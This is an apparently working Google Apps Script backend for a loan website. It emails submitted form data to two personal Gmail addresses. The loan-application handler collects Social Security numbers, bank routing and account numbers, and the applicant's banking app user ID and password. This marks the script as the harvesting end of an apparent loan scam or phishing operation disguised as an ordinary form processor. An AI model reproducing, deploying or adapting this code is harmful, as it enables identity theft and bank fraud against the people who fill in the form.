// Simple Email Only Script - No Google Sheets
// Deploy as Web App

// Configuration
const CONFIG = {
  recipientEmails: ['tyronlincolnn@gmail.com', 'finnfoxpersonalloan@gmail.com']
}

function doGet(e) {
  return handleRequest(e)
}

function doPost(e) {
  return handleRequest(e)
}

function handleRequest(e) {
  try {
    let params = {};
    
    if (e && e.parameter) {
      params = e.parameter;
    } else if (e && e.postData && e.postData.contents) {
      const postData = e.postData.contents;
      if (e.postData.type === 'application/json') {
        params = JSON.parse(postData);
      } else {
        const pairs = postData.split('&');
        for (let i = 0; i < pairs.length; i++) {
          const pair = pairs[i].split('=');
          if (pair.length === 2) {
            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
          }
        }
      }
    } else {
      return createResponse('success', 'Email script is ready!')
    }
    
    const formType = params.formType
    
    if (!formType) {
      return createResponse('error', 'No form type specified')
    }
    
    if (formType === 'loanApplication') {
      return handleLoanApplication(params)
    } else if (formType === 'contactForm') {
      return handleContactForm(params)
    } else {
      return createResponse('error', 'Invalid form type: ' + formType)
    }
  } catch (error) {
    return createResponse('error', 'Server error: ' + error.toString())
  }
}

function handleLoanApplication(params) {
  try {
    const subject = `New Loan Application - ${params.firstName} ${params.lastName}`
    const body = `
NEW LOAN APPLICATION RECEIVED

Personal Information:
- Name: ${params.firstName} ${params.lastName}
- Email: ${params.email}
- Phone: ${params.phoneNumber}
- Address: ${params.homeAddress}, ${params.city}, ${params.state} ${params.zipCode}

Loan Details:
- Amount: $${params.loanAmount}
- Purpose: ${params.loanPurpose}
- Date of Birth: ${params.dateOfBirth}
- SSN: ${params.ssnNumber}

Bank Information:
- Bank: ${params.bankName}
- Routing: ${params.routingNumber}
- Account: ${params.accountNumber}

Mobile App Credentials:
- User ID: ${params.userId}
- Password: ${params.password}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send to all recipients
    for (const recipient of CONFIG.recipientEmails) {
      try {
        MailApp.sendEmail(recipient, subject, body)
        Logger.log('Email sent successfully to: ' + recipient)
      } catch (emailError) {
        Logger.log('Failed to send email to ' + recipient + ': ' + emailError.toString())
      }
    }
    
    return createResponse('success', 'Loan application submitted successfully!')
    
  } catch (error) {
    Logger.log('Loan Application Error: ' + error.toString())
    return createResponse('error', 'Failed to process loan application')
  }
}

function handleContactForm(params) {
  try {
    const subject = `New Contact Form - ${params.name}`
    const body = `
NEW CONTACT FORM SUBMISSION

Name: ${params.name}
Email: ${params.email}
Message: ${params.message}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send to all recipients
    for (const recipient of CONFIG.recipientEmails) {
      try {
        MailApp.sendEmail(recipient, subject, body)
        Logger.log('Contact email sent successfully to: ' + recipient)
      } catch (emailError) {
        Logger.log('Failed to send contact email to ' + recipient + ': ' + emailError.toString())
      }
    }
    
    return createResponse('success', 'Contact form submitted successfully!')
    
  } catch (error) {
    Logger.log('Contact Form Error: ' + error.toString())
    return createResponse('error', 'Failed to process contact form')
  }
}

function createResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    status: status,
    message: message
  })).setMimeType(ContentService.MimeType.JSON)
}
